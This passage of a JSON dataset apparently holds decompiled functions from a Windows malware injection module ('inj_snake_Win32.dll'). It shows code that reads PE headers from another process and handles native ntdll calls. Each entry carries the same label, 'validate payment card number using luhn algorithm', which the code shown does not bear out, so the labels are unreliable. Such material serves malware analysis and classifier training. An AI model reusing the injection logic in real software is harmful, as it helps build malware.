-0xe8) == *(unaff_EBP + 0xc)) {\n                                    iVar1 = *(unaff_EBP + -200);\n                                    goto code_r0x2000f2f3;\n                                }\n                                iVar2 = *(unaff_EBP + -0x30);\n                            }\ncode_r0x2000f3b4:\n                            **(unaff_EBP + 0x10) = 0;\ncode_r0x2000f2f8:\n                            *(unaff_EBP + -0x1c) = 0;\n                        }\n                    }\n                }\n                else {\n                    iVar2 = fcn.2000d8f1(arg_8h_00, *(unaff_EBP + -0x24), 0, unaff_EBP + -0x58, 0x20);\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    if (iVar2 == 0) {\n                        iVar2 = *(unaff_EBP + -0x40);\n                        *(unaff_EBP + -0x24) = iVar2;\n                        if (iVar2 == 0) {\ncode_r0x2000f276:\n                            *(unaff_EBP + -0x1c) = 0xffffffff;\n                        }\n                        else {\n                            iVar2 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x98, 0x40);\n                            *(unaff_EBP + -0x1c) = iVar2;\n                            if (iVar2 == 0) {\n                                iVar2 = *(unaff_EBP + -0x78);\ncode_r0x2000f29a:\n                                if (iVar2 != *(unaff_EBP + -0x24) + 0x20) {\n                                    iVar3 = fcn.2000d8f1(arg_8h_00, iVar2, 0, unaff_EBP + -0x38, 0x10);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 == 0) {\n                                        iVar2 = fcn.2000d8f1(arg_8h_00, iVar2 + -0x10, 0, unaff_EBP + -0x160, 0x88);\n                                        *(unaff_EBP + -0x1c) = iVar2;\n                                        if (iVar2 == 0) {\n                                            if (*(unaff_EBP + -0x130) != *(unaff_EBP + 0xc)) goto code_r0x2000f300;\n                                            iVar1 = *(unaff_EBP + -0xf4);\ncode_r0x2000f2f3:\n                                            **(unaff_EBP + 0x10) = iVar1;\n                                            goto code_r0x2000f2f8;\n                                        }\n                                    }\n                                    goto code_r0x2000f263;\n                                }\n                                goto code_r0x2000f3b4;\n                            }\n                        }\n                    }\n                }\ncode_r0x2000f263:\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n        }\n    }\n    if (arg_8h_00 != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(arg_8h_00);\n    }\ncode_r0x2000f3e3:\n    fcn.200118c3();\n    return;\ncode_r0x2000f300:\n    iVar2 = *(unaff_EBP + -0x38);\n    goto code_r0x2000f29a;\n}\n",
        "token_count": 1749
    },
    "2000f925": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.2000f925(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x20032488, 0x14);\n    if (((*(unaff_EBP + 0xc) != 0) &&\n        (iVar1 = fcn.2000ec72(*(unaff_EBP + 8), *(unaff_EBP + 0xc), unaff_EBP + -0x20),  iVar1 == 0)) &&\n       (iVar1 = fcn.2000d9af(unaff_EBP + 0xc, 0x18, *(unaff_EBP + 8)),  iVar1 == 0)) {\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        (*_sym.imp.ntdll.dll_ZwFreeVirtualMemory)(*(unaff_EBP + 0xc), unaff_EBP + -0x20, unaff_EBP + -0x1c, 0x8000);\n        (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + 0xc));\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 363
    },
    "2001057d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001057d(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t s;\n    int32_t iVar2;\n    uint uVar3;\n    \n    s = arg_ch;\n    pcVar1 = _sym.imp.ntdll.dll_wcschr;\n    if (arg_ch == 0) {\n        return 0x21590066;\n    }\n    iVar2 = (*_sym.imp.ntdll.dll_wcschr)(arg_ch, 0x5c);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(arg_ch, 0x2f);\n        arg_ch = arg_ch & 0xffffff00;\n        if (iVar2 == 0) goto code_r0x200105b4;\n    }\n    arg_ch = CONCAT31(arg_ch._1_3_, 1);\ncode_r0x200105b4:\n    uVar3 = fcn.2000f9ac(arg_8h, s, arg_ch, 0, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 247
    },
    "20010e9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.20010e9b(int32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t arg_10h_00;\n    int32_t iVar1;\n    uint *arg_ch_00;\n    uint var_248h;\n    int32_t var_140h;\n    uint var_128h;\n    uint var_48h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = &var_140h;\n    var_4h = 0;\n    if (arg_8h == 0) {\n        return 0x21590065;\n    }\n    iVar1 = fcn.2000d9af(&var_4h, 0x18, arg_8h);\n    arg_10h_00 = arg_ch;\n    if ((iVar1 != 0) || (iVar1 = fcn.2000d8f1(var_4h, arg_ch, 0, &var_48h, 0x40),  iVar1 != 0)) goto code_r0x20010f9a;\n    if (var_48h == 0x5a4d) {\n        iVar1 = fcn.2000d8f1(var_4h, var_ch + arg_10h_00, (var_ch >> 0x1f) + CARRY4(var_ch, arg_10h_00), &var_140h, 0xf8\n                            );\n        if (iVar1 != 0) goto code_r0x20010f9a;\n        if (var_140h == 0x4550) {\n            arg_ch_00 = var_8h;\n            if (var_128h != 0x10b) {\n                iVar1 = fcn.2000d8f1(var_4h, var_ch + arg_10h_00, (var_ch >> 0x1f) + CARRY4(var_ch, arg_10h_00), \n                                     &var_248h, 0x108);\n                if (iVar1 != 0) goto code_r0x20010f9a;\n                arg_ch_00 = &var_248h;\n            }\n            iVar1 = fcn.20010b89(var_4h, arg_ch_00, arg_10h_00, arg_8h, arg_10h_00, arg_10h, arg_14h, &arg_8h);\n            goto code_r0x20010f9a;\n        }\n    }\n    iVar1 = -1;\ncode_r0x20010f9a:\n    fcn.2000d9e0(var_4h);\n    return iVar1;\n}\n",
        "token_count": 628
    },
    "20010fa9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20010fa9(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        iVar1 = 0x21590067;\n    }\n    else if (arg_14h == 0) {\n        iVar1 = 0x21590068;\n    }\n    else if (arg_8h == 0) {\n        iVar1 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.2000f1b4(arg_8h, arg_ch, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == 0) {\n                iVar1 = 0x21590005;\n            }\n            else {\n                iVar1 = fcn.20010e9b(arg_8h, arg_ch, arg_10h, arg_14h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 272
    },
    "200110f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.200110f4(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    \n    *(unaff_ESI + 0x77) = 1;\n    iVar1 = fcn.20010fa9(*(unaff_ESI + 0x17), *(unaff_ESI + 0xf), 0x2002d900, unaff_ESI + 0x97);\n    if (iVar1 == 0) {\n        iVar1 = fcn.20001751();\n        if (iVar1 < 0x1b) {\n            iVar1 = fcn.2001654e();\n        }\n        else {\n            iVar1 = fcn.2001654e();\n        }\n        if (iVar1 == 0) {\n            *(unaff_ESI + 0x4b) = 0;\n            *(unaff_ESI + 0x4f) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "20011afa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20011afa(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.200118f3(arg_ch, arg_10h, arg_14h, 0, 0, arg_18h, 0);\n    return;\n}\n",
        "token_count": 78
    },
    "20011b1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.20011b1d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.200118f3(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, 1);\n    return;\n}\n",
        "token_count": 96
    },
    "20011cc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20011cc7(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x25) || (pcVar1 = (**arg_8h)[9],  pcVar1 == NULL)) {\n            fcn.20011aba();\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if (iVar2 == 0) {\n                iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n            }\n            fcn.20011aba();\n        }\n    }\n    else {\n        iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return iVar2;\n}\n",
        "token_count": 267
    },
    "20012045": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20012045(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.20011ecc(arg_ch, arg_10h);\n    if (iVar1 == 0x21590001) {\n        iVar2 = fcn.20012f52(arg_ch, &var_4h);\n        if (iVar2 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.20011dff(arg_8h, iVar2, var_4h, arg_10h);\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 181
    },
    "200120a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200120a1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    iVar1 = fcn.20011f79(arg_ch, arg_10h, arg_14h);\n    if (iVar1 == 0x21590001) {\n        arg_ch_00 = fcn.20012f52(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.20011f1d(arg_8h, arg_ch_00, var_4h, arg_10h, arg_14h);\n            (*_sym.imp.msvcrt.dll_free)(arg_ch_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 211
    },
    "2001226b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001226b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sym.inj_snake_Win32.dll_tr_get_callbacks(arg_8h);\n    if ((0x28 < *(iVar1 + 0x10)) && (*(iVar1 + 0x28) != NULL)) {\n    // WARNING: Could not recover jumptable at 0x20012287. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(iVar1 + 0x28))();\n        return uVar2;\n    }\n    return 0x21590001;\n}\n",
        "token_count": 150
    },
    "20012290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20012290(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sym.inj_snake_Win32.dll_tr_get_callbacks(arg_8h);\n    if ((0x2c < *(iVar1 + 0x10)) && (*(iVar1 + 0x2c) != NULL)) {\n    // WARNING: Could not recover jumptable at 0x200122ac. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(iVar1 + 0x2c))();\n        return uVar2;\n    }\n    return 0x21590001;\n}\n",
        "token_count": 152
    },
    "200122b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.200122b5(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sym.inj_snake_Win32.dll_tr_get_callbacks(param_1);\n    if ((0x30 < *(iVar1 + 0x10)) && (*(iVar1 + 0x30) != NULL)) {\n    // WARNING: Could not recover jumptable at 0x200122ce. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(iVar1 + 0x30))();\n        return uVar2;\n    }\n    return 0x21590001;\n}\n",
        "token_count": 146
    },
    "200122d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.200122d6(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sym.inj_snake_Win32.dll_tr_get_callbacks(param_1);\n    if ((0x34 < *(iVar1 + 0x10)) && (*(iVar1 + 0x34) != NULL)) {\n    // WARNING: Could not recover jumptable at 0x200122ef. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(iVar1 + 0x34))();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 142
    },
    "200122f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.200122f4(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sym.inj_snake_Win32.dll_tr_get_callbacks(param_1);\n    if ((0x38 < *(iVar1 + 0x10)) && (*(iVar1 + 0x38) != NULL)) {\n    // WARNING: Could not recover jumptable at 0x2001230d. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(iVar1 + 0x38))();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 143
    },
    "20012f0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20012f0c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    ppiVar3 = 0x2004653c;\n    do {\n        for (piVar2 = *ppiVar3; (piVar2 != NULL && (*piVar2 != 0)); piVar2 = piVar2 + 3) {\n            iVar1 = sub.ntdll.dll_strcmp(*piVar2, param_1);\n            if ((iVar1 == 0) && (piVar2[1] == param_2)) {\n                return piVar2[2];\n            }\n        }\n        ppiVar3 = ppiVar3 + -2;\n        if (ppiVar3 < 0x200464f4) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 204
    },
    "20012f52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.20012f52(int32_t **param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    *param_2 = 0;\n    ppiVar2 = param_1;\n    if (param_1 != NULL) {\n        do {\n            *param_2 = *param_2 + ppiVar2[2];\n            ppiVar2 = *ppiVar2;\n        } while (ppiVar2 != NULL);\n    }\n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(*param_2);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        for (; param_1 != NULL; param_1 = *param_1) {\n            sub.ntdll.dll_memcpy(iVar3 + iVar1, param_1[1], param_1[2]);\n            iVar3 = iVar3 + param_1[2];\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 239
    },
    "2001300b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001300b(int32_t **ptr, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    ppiVar1 = ptr;\n    *ptr = NULL;\n    var_4h = 0;\n    piVar5 = arg_ch;\n    do {\n        if (*piVar5 == 0) {\n            return 0x21590005;\n        }\n        iVar2 = (*_sym.imp.msvcrt.dll__strdup)(*piVar5);\n        if (iVar2 == 0) {\n            return 0x21590004;\n        }\n        var_8h = (*_sym.imp.ntdll.dll_strchr)(iVar2, 0x2e);\n        if (var_8h != NULL) {\n            *var_8h = 0;\n            var_8h = var_8h + 1;\n        }\n        iVar3 = fcn.20012fb4(iVar2, arg_20h);\n        if (iVar3 == 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            ptr = 0x21590005;\n            if (*0x200464e0 == 0) {\ncode_r0x200130f0:\n                if ((*0x200464e8 != 0) &&\n                   (ptr = (**(*0x200464e8 + 0xc))(ppiVar1, *piVar5, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h), \n                   ptr == NULL)) {\n                    iVar3 = *0x200464e8;\n                }\n            }\n            else {\n                ptr = (**(*0x200464e0 + 0xc))(ppiVar1, *piVar5, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                if (ptr == NULL) {\n                    iVar3 = *0x200464e0;\n                }\n                if (ptr == 0x21590005) goto code_r0x200130f0;\n            }\n            if (iVar3 != 0) goto code_r0x2001315c;\n            if (ptr != 0x21590005) {\n                return ptr;\n            }\n        }\n        else {\n            if (var_8h == NULL) {\n                iVar4 = sub.ntdll.dll_strlen(iVar2);\n            }\n            else {\n                iVar4 = var_8h - iVar2;\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            ptr = (**(iVar3 + 0xc))(ppiVar1, *piVar5 + iVar4, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        }\n        if (iVar3 != 0) {\ncode_r0x2001315c:\n            if (ptr != NULL) {\n                return ptr;\n            }\n            if (*ppiVar1 != NULL) {\n                piVar5 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n                if (piVar5 == NULL) {\n                    (**(iVar3 + 0x10))(*ppiVar1, 0);\n                    (**(iVar3 + 0x14))(*ppiVar1, 0);\n                    *ppiVar1 = NULL;\n                }\n                else {\n                    *piVar5 = iVar3;\n                    piVar5[1] = 0;\n                    piVar5[2] = 0;\n                    piVar5[3] = 1;\n                    **ppiVar1 = piVar5;\n                    iVar2 = fcn.2001396b(*ppiVar1, 2);\n                    if (iVar2 != 0) {\n                        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(0x20046ed4);\n                        return 0;\n                    }\n                    (*_sym.imp.msvcrt.dll_free)(piVar5);\n                    (**(iVar3 + 0x10))(*ppiVar1, 0);\n                    (**(iVar3 + 0x14))(*ppiVar1, 0);\n                    *ppiVar1 = NULL;\n                }\n                return 0x21590004;\n            }\n            (**(iVar3 + 0x10))(0, 0);\n            (**(iVar3 + 0x14))(*ppiVar1, 0);\n            return -1;\n        }\n        var_4h = var_4h + 1;\n        piVar5 = arg_ch + var_4h;\n    } while( true );\n}\n",
        "token_count": 1069
    },
    "2001340b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001340b(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (arg_8h == NULL) {\n        iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        iVar2 = fcn.200132c8();\n        if (iVar2 == 0) {\n            if ((***arg_8h < 0x39) || (pcVar1 = (**arg_8h)[0xe],  pcVar1 == NULL)) {\n                fcn.200131f7();\n                iVar2 = 0x21590001;\n            }\n            else {\n                iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n                }\n                fcn.200131f7();\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 283
    },
    "20013845": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20013845(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.20013788(arg_ch, arg_10h);\n    if (iVar1 == 0x21590001) {\n        iVar2 = fcn.20012f52(arg_ch, &var_4h);\n        if (iVar2 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.20013589(arg_8h, iVar2, var_4h, arg_10h);\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 181
    },
    "200138a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200138a1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    iVar1 = fcn.200137d9(arg_ch, arg_14h, arg_18h, arg_1ch);\n    if (iVar1 == 0x21590001) {\n        arg_ch_00 = fcn.20012f52(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.20013656(arg_8h, arg_ch_00, var_4h, arg_10h, arg_14h, arg_18h, arg_1ch);\n            (*_sym.imp.msvcrt.dll_free)(arg_ch_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 236
    },
    "20015990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20015990(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_84h;\n    uint var_4h;\n    \n    uVar2 = arg_ch;\n    var_4h = arg_ch;\n    iVar1 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    do {\n        if (iVar1 == 0) {\n            uVar2 = fcn.20022b99(*(arg_8h + 4), uVar2, 0);\n            return uVar2;\n        }\n        iVar1 = (*_sym.imp.ntdll.dll__stricmp)(&var_84h, \"d2s_max_data_wait\");\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.ntdll.dll_atoi)(arg_ch);\n            if (iVar1 < 1) {\n                return 0x21590066;\n            }\n            *(arg_8h + 0x1c) = iVar1 * 1000;\n        }\n        iVar1 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    } while( true );\n}\n",
        "token_count": 286
    },
    "20015a3b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20015a3b(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.20022b15(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 82
    },
    "20015a5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20015a5a(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.20022c43(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 82
    },
    "20015a79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20015a79(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.20022c9f(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 82
    },
    "20015aab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20015aab(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    iVar2 = fcn.20022a23(*(arg_8h + 4), arg_ch, arg_10h, &var_4h, &arg_8h, 10000, 2);\n    if (iVar2 == 0) {\n        *(iVar1 + 0x18) = 500;\n        fcn.200012c9(iVar1 + 8);\n    }\n    return iVar2;\n}\n",
        "token_count": 156
    },
    "20015af1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20015af1(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    iVar2 = fcn.20022cfb(*(arg_8h + 4), arg_ch, &var_4h, &arg_8h, 10000, 2);\n    if (iVar2 == 0) {\n        *(iVar1 + 0x18) = 500;\n        fcn.200012c9(iVar1 + 8);\n    }\n    return iVar2;\n}\n",
        "token_count": 146
    },
    "20015f1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20015f1f(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    \n    arg_8h_00 = *(arg_8h + 8);\n    if ((arg_8h_00 == 0) && (arg_8h_00 = *(arg_8h + 4),  arg_8h_00 == 0)) {\n        fcn.2001579c(arg_ch, arg_10h, arg_14h, arg_18h);\n        return;\n    }\n    fcn.2001340b(arg_8h_00, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 183
    },
    "20015f57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.20015f57(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0x21590001;\n    uVar1 = 0x21590001;\n    if (*(arg_8h + 4) != 0) {\n        iVar2 = fcn.200136d0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, 0);\n    }\n    if (*(arg_8h + 8) != 0) {\n        uVar1 = fcn.200136d0(*(arg_8h + 8), arg_ch, arg_10h, arg_14h, 0);\n    }\n    return -(iVar2 != 0) & uVar1;\n}\n",
        "token_count": 201
    },
    "20015fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20015fb0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_8h_00;\n    \n    arg_8h_00 = *(arg_8h + 8);\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = *(arg_8h + 4);\n    }\n    fcn.2001372c(arg_8h_00, arg_ch, arg_10h, arg_14h, 0);\n    return;\n}\n",
        "token_count": 133
    },
    "20016274": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20016274(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    fcn.20001567(arg_8h + 0x14);\n    uVar1 = fcn.20015fd8(0, 0, arg_ch, arg_10h, arg_14h, arg_18h);\n    fcn.2000157d(arg_8h + 0x14);\n    return uVar1;\n}\n",
        "token_count": 126
    },
    "200162ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
